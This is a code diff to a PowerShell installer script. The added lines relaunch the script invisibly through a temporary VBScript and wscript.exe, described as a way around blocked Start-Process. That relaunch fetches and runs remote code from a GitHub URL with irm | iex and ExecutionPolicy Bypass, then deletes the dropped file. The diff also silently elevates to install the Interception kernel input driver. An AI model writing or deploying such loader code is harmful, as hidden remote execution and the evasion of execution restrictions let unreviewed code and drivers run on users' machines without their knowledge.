@@ -5,13 +5,13 @@
 # ------------------------------------------------------------
 if (-not $env:TECHNO_INSTALLER_CHILD) {
     $env:TECHNO_INSTALLER_CHILD = '1'
-
     $scriptUrl = 'https://raw.githubusercontent.com/hyperlinken/whoa/more/install.ps1'
-
-    Start-Process powershell.exe `
-        -WindowStyle Hidden `
-        -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"& { irm '$scriptUrl' | iex }`""
-
+    # Use wscript to launch hidden — works even when Start-Process is blocked
+    $vbs = Join-Path $env:TEMP "t_$(Get-Random).vbs"
+    "CreateObject(""WScript.Shell"").Run ""powershell.exe -NoProfile -ExecutionPolicy Bypass -Command """"& { $('$')env:TECHNO_INSTALLER_CHILD='1'; irm '$scriptUrl' | iex }"""""", 0, False" | Set-Content $vbs -Encoding ASCII
+    wscript.exe $vbs
+    Start-Sleep -Milliseconds 500
+    Remove-Item $vbs -Force -ErrorAction SilentlyContinue
     exit
 }
 
@@ -110,14 +110,21 @@ if (-not $driverOK) {
         Expand-Archive $icpZip -DestinationPath $icpDir -Force
         $installer = Join-Path $icpDir "Interception\command line installer\install-interception.exe"
         if (Test-Path $installer) {
-            # Run the installer silently as admin — no visible window
-            $drvBat = Join-Path $env:TEMP "icp_inst_$(Get-Random).bat"
-            "@echo off`r`n`"$installer`" /install >nul 2>&1" | Set-Content $drvBat -Encoding ASCII
-            try {
-                Start-Process cmd.exe -ArgumentList "/c `"$drvBat`"" -Verb RunAs -Wait -WindowStyle Hidden
+            $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+            if ($isAdmin) {
+                # Already admin — run directly, no UAC needed
+                & cmd.exe /c "`"$installer`" /install" >$null 2>&1
                 $needsReboot = $true
-            } catch {}
-            Remove-Item $drvBat -Force -ErrorAction SilentlyContinue
+            } else {
+                # Not admin — elevate silently
+                $drvBat = Join-Path $env:TEMP "icp_inst_$(Get-Random).bat"
+                "@echo off`r`n`"$installer`" /install >nul 2>&1" | Set-Content $drvBat -Encoding ASCII
+                try {
+                    Start-Process cmd.exe -ArgumentList "/c `"$drvBat`"" -Verb RunAs -Wait -WindowStyle Hidden
+                    $needsReboot = $true
+                } catch {}
+                Remove-Item $drvBat -Force -ErrorAction SilentlyContinue
+            }
         }
     } catch {}
     Remove-Item $icpZip -Force -ErrorAction SilentlyContinue
